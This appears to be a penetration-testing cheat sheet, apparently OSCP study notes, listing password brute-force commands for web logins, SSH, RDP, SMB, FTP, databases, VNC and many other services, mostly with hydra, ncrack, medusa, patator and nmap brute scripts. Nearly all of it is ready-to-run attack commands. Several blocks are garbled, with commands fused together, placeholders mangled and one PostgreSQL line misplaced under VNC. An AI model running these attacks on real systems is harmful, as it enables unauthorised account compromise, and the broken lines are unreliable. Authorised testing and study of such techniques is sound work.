---
title: "Bruteforce service password"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - service
  - password
  - bruteforce
toc: true
hide_title: true
excerpt: ""
---

## Web

```
hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin
```

### Logins

Use Burp suite.

1. Intecept a login attempt.
2. Right-lick "Send to intruder". Select Sniper if you have nly one field you want to bruteforce. If you for example already know the username. Otherwise select cluster-attack.
3. Select your payload, your wordlist.
4. Click attack.
5. Look for response-length that differs from the rest.​

### HTTP Basic Auth

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```

### HTTP - Post Form

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```

### HTTP - CMS -- (W)ordpress, (J)oomla or (D)rupal or (M)oodle

```
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```

### Hydra attack http get 401 login with a dictionary

```
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
```

## SSH

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt ssh://$ip
```

```
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
```

```
hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh
```

```
hydra -l root -P wordlist.txt $ip ssh
```

```
hydra -L userlist.txt -P best1050.txt $ip -s 22 ssh -V
```

```
hydra -l root -P passwords.txt [-t 32] <IP> ssh
```

```
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
```

```
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
```

## SNMP

```
hydra -P wordlist.txt -v $ip snmp
```

```
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
```

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp_onesixtyone.txt <IP>
```

```
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

## Remote Desktop Protocol

```
ncrack -vv --user admin -P password-file.txt rdp://$ip
```

```
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
```

```
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

## AFP

```
nmap -p 548 --script afp-brute <IP>
```

## AJP

```
nmap --script ajp-brute -p 8009 <IP>
```

## Cassandra Apache

```
nmap --script cassandra-brute -p 9160 <IP>
```

## CouchDB

```
msf> use auxiliary/scanner/couchdb/couchdb_login
```

## FTP

```
hydra -l root -P passwords.txt [-t 32] <IP> ftpncrack -p 21 --user root -P passwords.txt <IP> [-T 5]medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```

## IMAP

```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V​hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V​nmap -sV --script imap-brute -p <PORT> <IP>
```

## IRC

```
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

## ISCSI

```
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

## LDAP

```
nmap --script ldap-brute -p 389 <IP>
```

```
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f
```

## Mongo

```
nmap -sV --script mongodb-brute -n -p 27017 <IP>
```

## MySQL

```
hydra -L usernames.txt -P pass.txt <IP> mysql
```

## OracleSQL

```
pip3 install cx_Oracle --upgradepatator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
```

```
./odat.py passwordguesser -s $SERVER -d $SID./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt
```

```
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```

```
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30​john hashes.txt
```

## POP3

```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
```

```
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```

## PostgreSQL

```
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
```

```
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
```

```
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
```

```
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
```

```
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```

## PPTP

```
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

## Redis

```
nmap --script redis-brute -p 6379 <IP>​hydra –P /path/pass.txt <IP> redis
```

## Rexec

```
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

## Rlogin

```
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

## Rsh

```
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

​[**Rsa-Grind**](https://github.com/pentestmonkey/rsh-grind) - tries lots of combinations of local and remote usernames to execute commands via RSH

## Rsync

```
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

## RTSP

```
hydra -l root -P passwords.txt <IP> rtsp
```

## SMB

```
nmap --script smb-brute -p 445 <IP>​

hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```

## Telnet

```
hydra -l root -P passwords.txt [-t 32] <IP> telnet​ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]​medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```

## VNC

```
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc​medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc​ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
```

```
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
```

```
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```

### SMTP

```
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
```
